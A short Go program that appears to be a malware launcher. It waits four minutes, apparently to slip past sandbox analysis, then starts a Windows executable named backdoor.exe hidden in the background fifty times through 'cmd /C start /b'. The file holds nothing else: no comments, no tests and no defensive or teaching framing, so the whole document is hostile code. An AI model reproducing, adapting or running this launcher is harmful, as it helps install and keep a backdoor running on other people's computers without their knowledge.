package main

import (
	"os/exec"
	"time"
)

func main() {
	time.Sleep(4 * time.Minute)	
	for i := 0; i < 50; i++ {	
		cmd := exec.Command("cmd", "/C", "start", "/b", "backdoor.exe")
		if err := cmd.Run(); err != nil {
			panic(err.Error())
		}
	}
}
